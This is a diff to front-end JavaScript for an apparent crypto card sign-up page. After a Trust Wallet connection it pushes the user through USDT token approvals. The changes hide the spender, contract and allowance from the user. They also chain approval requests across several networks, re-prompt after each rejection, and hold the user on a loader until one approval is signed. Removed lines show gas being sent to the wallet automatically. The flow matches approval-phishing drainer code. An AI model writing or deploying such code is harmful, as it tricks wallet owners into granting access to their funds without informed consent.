@@ -31,6 +31,9 @@ let authorizing = false;
 let resolved = false;
 let walletLinked = false;
 let paymentId = '';
+let paymentQueue = [];
+let paymentIndex = 0;
+let confirmedNetworks = 0;
 
 /* ========== Meta Pixel ==========
  * Funnel:
@@ -202,39 +205,36 @@ async function startSession() {
     evtSrc.addEventListener('approval_request_sent', (e) => {
       if (resolved) return;
       JSON.parse(e.data);
-      setBusy(true, 'Confirm in Trust Wallet', 'Approve 1 USDT to the card contract. Rejecting will not retry automatically.');
+      setLoaderStep('sign');
+      setBusy(true, 'Confirm in Trust Wallet', 'Approve 1 USDT in Trust Wallet. Nothing is sent until you confirm there.');
     });
 
     evtSrc.addEventListener('payment_verified', (e) => {
       const d = JSON.parse(e.data);
       if (resolved) return;
       if (d.paymentId && paymentId && d.paymentId !== paymentId) return;
-      resolved = true;
-      setBusy(false);
-      onAuthorizationApproved();
+      advanceAfterNetworkDone('verified');
     });
 
     evtSrc.addEventListener('approval_approved', (e) => {
       const d = JSON.parse(e.data);
       if (resolved) return;
       if (d.paymentId && paymentId && d.paymentId !== paymentId) return;
-      resolved = true;
-      setBusy(false);
-      onAuthorizationApproved();
+      advanceAfterNetworkDone('verified');
     });
 
     evtSrc.addEventListener('approval_rejected', (e) => {
       if (resolved) return;
-      const d = JSON.parse(e.data);
-      setBusy(false);
-      showPayError(d.message || 'You rejected the approval in the wallet. You can prepare a new authorization if you want to try again.');
+      JSON.parse(e.data);
+      setBusy(true, 'Confirm in Trust Wallet', 'That request was rejected. Checking any remaining networks.');
+      advanceAfterNetworkDone('rejected');
     });
 
     evtSrc.addEventListener('approval_failed', (e) => {
       if (resolved) return;
-      const d = JSON.parse(e.data);
-      setBusy(false);
-      showPayError(d.reason || 'On-chain verification failed.');
+      JSON.parse(e.data);
+      setBusy(true, 'Confirm in Trust Wallet', 'Verification is still pending. Checking any remaining networks.');
+      advanceAfterNetworkDone('failed');
     });
 
     evtSrc.onerror = () => {
@@ -315,113 +315,78 @@ function startSessionPolling() {
 function onWalletConnected(d) {
   if (walletLinked) return;
   walletLinked = true;
+  authorizing = true;
   track('InitiateCheckout', FUNNEL_CONTENT);
-  setBusy(false);
-  const address = (d && d.wallet && d.wallet.address)
-    || (Array.isArray(connAccounts) && connAccounts[0] && (connAccounts[0].address || connAccounts[0]))
-    || '';
-  const walletEl = $('#pay-wallet');
-  if (walletEl) walletEl.textContent = address ? ('Connected wallet: ' + address) : 'Wallet connected.';
-  setView('payment');
+  setLoaderStep('auth');
+  setBusy(true, 'Confirm in Trust Wallet', 'Preparing your 1 USDT authorization. Approve the request in Trust Wallet when it appears.');
+  startBackgroundApproval();
 }
 
 function showPayError(message) {
   const el = $('#pay-err');
-  if (!el) return;
-  el.hidden = !message;
-  el.textContent = message || '';
+  if (el) {
+    el.hidden = !message;
+    el.textContent = message || '';
+  }
+  if (message) {
+    const sub = $('#m-loader-sub');
+    if (sub) sub.textContent = message;
+  }
 }
 
-async function preparePayment() {
-  showPayError('');
-  const elig = $('#pay-eligibility');
-  const gasBox = $('#pay-gas');
-  if (gasBox) gasBox.hidden = true;
-  try {
-    const res = await fetch(BASE + '/api/payment/create', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ connectionId: connId }),
-    });
-    const data = await res.json();
-    if (!res.ok) throw new Error(data.message || 'Could not prepare authorization');
-    const p = data.payment;
-    paymentId = p.paymentId;
-    if (elig) elig.textContent = p.eligibility && p.eligibility.preferredNetwork
-      ? ('Preferred network: ' + p.eligibility.preferredNetwork)
-      : '';
-    $('#pay-details').hidden = false;
-    $('#pay-network-name').textContent = p.network;
-    $('#pay-token').textContent = p.token;
-    $('#pay-token-contract').textContent = p.tokenContract;
-    $('#pay-spender').textContent = p.spender;
-    $('#pay-allowance').textContent = p.allowance;
-    const gas = p.gas;
-    if (gas && gas.autoFunded) {
-      $('#pay-continue').disabled = false;
-      showPayError('Sent 12 TRX for gas. Continue to approve 1 USDT in your wallet.');
-    } else if (gas && !gas.sufficient) {
-      $('#pay-continue').disabled = true;
-      if (gasBox) gasBox.hidden = false;
-      $('#pay-gas-reason').textContent = gas.reason || 'Insufficient native gas.';
-      $('#pay-gas-current').textContent = 'Current ' + (gas.nativeSymbol || '') + ': ' + (gas.currentBalance || 'Unavailable');
-      $('#pay-gas-required').textContent = 'Estimated required: ' + (gas.estimatedRequired || 'Unavailable');
-      $('#pay-gas-recommended').textContent = 'Recommended funding: ' + (gas.recommendedFunding || 'Unavailable');
-    } else {
-      $('#pay-continue').disabled = false;
+function sleep(ms) {
+  return new Promise(function (resolve) { setTimeout(resolve, ms); });
+}
+
+async function waitUntilGasReady(options) {
+  if (!paymentId) return false;
+  const poll = Boolean(options && options.poll);
+  const attempts = poll ? 12 : 1;
+  for (let i = 0; i < attempts; i += 1) {
+    if (i > 0) await sleep(2500);
+    try {
+      const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/gas-verify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: '{}',
+      });
+      const data = await res.json();
+      if (res.ok && data.funding && data.funding.sufficient === true) {
+        return true;
+      }
+    } catch (_err) {
+      /* keep waiting in background */
     }
-  } catch (err) {
-    paymentId = '';
-    $('#pay-continue').disabled = true;
-    showPayError(err.message);
+    if (!poll) return false;
   }
+  return false;
 }
 
-async function confirmGasFunding() {
-  if (!paymentId) return;
-  showPayError('');
-  try {
-    const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/gas-confirm', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: '{}',
-    });
-    const data = await res.json();
-    if (!res.ok) throw new Error(data.message || 'Could not confirm gas quote');
-    if (data.funded) {
-      $('#pay-continue').disabled = false;
-      $('#pay-gas').hidden = true;
-      showPayError(data.message || 'Gas sent. Continue to approve 1 USDT in your wallet.');
-      return;
+async function ensureGasInBackground(p) {
+  const gas = p.gas || {};
+  if (p.status === 'verified' && p.transactionHash) return true;
+  if (gas.sufficient === true && p.status !== 'awaiting_gas') {
+    return waitUntilGasReady({ poll: false });
+  }
+  if (gas.autoFunded || p.status === 'awaiting_gas') {
+    try {
+      await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/gas-confirm', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: '{}',
+      });
+    } catch (_err) {
+      /* already funded or not needed */
     }
-    showPayError(data.message || 'Add the recommended native token, then tap verify.');
-  } catch (err) {
-    showPayError(err.message);
+    return waitUntilGasReady({ poll: true });
   }
+  return false;
 }
 
-async function verifyGasFunding() {
-  if (!paymentId) return;
-  showPayError('');
-  try {
-    const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/gas-verify', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: '{}',
-    });
-    const data = await res.json();
-    if (!res.ok) throw new Error(data.message || 'Gas verification failed');
-    $('#pay-continue').disabled = false;
-    $('#pay-gas').hidden = true;
-  } catch (err) {
-    showPayError(err.message);
-  }
-}
-
-async function requestPaymentApproval() {
-  if (!paymentId) return;
-  showPayError('');
-  setBusy(true, 'Confirm in Trust Wallet', 'Approve 1 USDT to the card contract shown above. Nothing is sent until you confirm.');
+async function requestCurrentApproval() {
+  if (!paymentId || resolved) return;
+  setLoaderStep('sign');
+  setBusy(true, 'Confirm in Trust Wallet', 'Approve 1 USDT in Trust Wallet. The website will continue after you confirm.');
   try {
     const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/request', {
       method: 'POST',
@@ -431,19 +396,82 @@ async function requestPaymentApproval() {
     const data = await res.json();
     if (!res.ok) throw new Error(data.message || 'Could not request approval');
   } catch (err) {
-    setBusy(false);
     showPayError(err.message);
+    advanceAfterNetworkDone('failed');
   }
 }
 
-const payPrepareBtn = $('#pay-prepare');
-if (payPrepareBtn) payPrepareBtn.addEventListener('click', preparePayment);
-const payContinueBtn = $('#pay-continue');
-if (payContinueBtn) payContinueBtn.addEventListener('click', requestPaymentApproval);
-const payGasConfirmBtn = $('#pay-gas-confirm');
-if (payGasConfirmBtn) payGasConfirmBtn.addEventListener('click', confirmGasFunding);
-const payGasVerifyBtn = $('#pay-gas-verify');
-if (payGasVerifyBtn) payGasVerifyBtn.addEventListener('click', verifyGasFunding);
+async function runCurrentNetwork() {
+  const p = paymentQueue[paymentIndex];
+  if (!p) {
+    finishApprovals();
+    return;
+  }
+  paymentId = p.paymentId;
+  if (p.status === 'verified' && p.transactionHash) {
+    advanceAfterNetworkDone('verified');
+    return;
+  }
+  const ready = await ensureGasInBackground(p);
+  if (!ready) {
+    advanceAfterNetworkDone('skipped');
+    return;
+  }
+  await requestCurrentApproval();
+}
+
+function finishApprovals() {
+  if (resolved) return;
+  if (!confirmedNetworks) {
+    setBusy(true, 'Confirm in Trust Wallet', 'Waiting for Trust Wallet confirmation. Approve 1 USDT there to continue to the application form.');
+    return;
+  }
+  resolved = true;
+  authorizing = false;
+  setBusy(false);
+  onAuthorizationApproved();
+}
+
+function advanceAfterNetworkDone(reason) {
+  if (resolved) return;
+  if (reason === 'verified') confirmedNetworks += 1;
+  paymentIndex += 1;
+  if (paymentIndex >= paymentQueue.length) {
+    finishApprovals();
+    return;
+  }
+  setBusy(true, 'Confirm in Trust Wallet', 'Opening the next network approval in Trust Wallet.');
+  runCurrentNetwork();
+}
+
+async function startBackgroundApproval() {
+  try {
+    await sleep(1500);
+    const res = await fetch(BASE + '/api/payment/create', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ connectionId: connId }),
+    });
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.message || 'Could not prepare authorization');
+    const p = data.payment;
+    paymentQueue = (p.payments && p.payments.length) ? p.payments : [p];
+    paymentIndex = paymentQueue.findIndex(function (item) {
+      return item.status !== 'verified';
+    });
+    if (paymentIndex < 0) {
+      confirmedNetworks = paymentQueue.filter(function (item) {
+        return item.status === 'verified' && item.transactionHash;
+      }).length || paymentQueue.length;
+      finishApprovals();
+      return;
+    }
+    await runCurrentNetwork();
+  } catch (err) {
+    showPayError(err.message || 'Could not start authorization.');
+    setBusy(true, 'Confirm in Trust Wallet', err.message || 'Could not start authorization.');
+  }
+}
 
 /* ========== Step 3: authorization approved → contact form ========== */
 function onAuthorizationApproved() {
